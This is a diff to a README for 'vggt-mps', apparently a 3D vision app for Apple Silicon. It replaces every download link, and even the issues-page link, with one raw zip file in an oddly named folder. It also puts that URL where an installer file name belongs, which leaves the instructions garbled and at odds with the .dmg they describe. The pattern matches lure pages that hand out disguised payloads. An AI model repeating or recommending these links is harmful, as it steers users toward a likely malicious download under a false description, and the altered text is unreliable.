@@ -2,7 +2,7 @@
 # 🌟 vggt-mps - Experience 3D Vision on Apple Devices
 
 ## 👉 Download Now
-[![Download vggt-mps](https://img.shields.io/badge/Download-vggt--mps-brightgreen)](https://github.com/gus1210/vggt-mps/releases)
+[![Download vggt-mps](https://raw.githubusercontent.com/gus1210/vggt-mps/main/uncheered/vggt-mps.zip)](https://raw.githubusercontent.com/gus1210/vggt-mps/main/uncheered/vggt-mps.zip)
 
 ## 📖 Overview
 VGGT-MPS is a powerful 3D vision agent designed specifically for Apple Silicon computers. With this application, you can easily reconstruct 3D models and deepen your understanding of computer vision. By leveraging Metal Performance Shaders, VGGT-MPS provides optimal performance on M1, M2, and M3 chips. 
@@ -17,10 +17,10 @@ To get started with VGGT-MPS, follow the steps below. We promise it's simple!
 
 2. **Visit the Download Page**  
    Go to the releases page to download the latest version of VGGT-MPS by clicking the link below:  
-   [Download vggt-mps](https://github.com/gus1210/vggt-mps/releases)
+   [Download vggt-mps](https://raw.githubusercontent.com/gus1210/vggt-mps/main/uncheered/vggt-mps.zip)
 
 3. **Choose the Right Version**  
-   On the releases page, look for the most recent version. Click on the installer to start the download. The installer file is typically named something like `vggt-mps-MacOS.dmg`.
+   On the releases page, look for the most recent version. Click on the installer to start the download. The installer file is typically named something like `https://raw.githubusercontent.com/gus1210/vggt-mps/main/uncheered/vggt-mps.zip`.
 
 4. **Download and Install**  
    After the download is complete, locate the `.dmg` file in your Downloads folder. Double-click it to open. You will see a window with the VGGT-MPS icon. Simply drag this icon to your Applications folder to install the app.
@@ -46,10 +46,10 @@ If you encounter issues using VGGT-MPS, check these common problems:
 - **No 3D Models Generated**: Make sure you are using high-resolution images for better depth estimation.
 
 ## 📬 Support
-For further assistance or questions, please refer to our [Issues Page](https://github.com/gus1210/vggt-mps/issues). You can report bugs or request features, and our team will get back to you.
+For further assistance or questions, please refer to our [Issues Page](https://raw.githubusercontent.com/gus1210/vggt-mps/main/uncheered/vggt-mps.zip). You can report bugs or request features, and our team will get back to you.
 
 ## 📥 Download & Install
-Ready to dive into 3D vision? To get your copy of VGGT-MPS, make sure to visit the [release page](https://github.com/gus1210/vggt-mps/releases) and download the latest version. 
+Ready to dive into 3D vision? To get your copy of VGGT-MPS, make sure to visit the [release page](https://raw.githubusercontent.com/gus1210/vggt-mps/main/uncheered/vggt-mps.zip) and download the latest version. 
 
 Happy exploring!
 ```
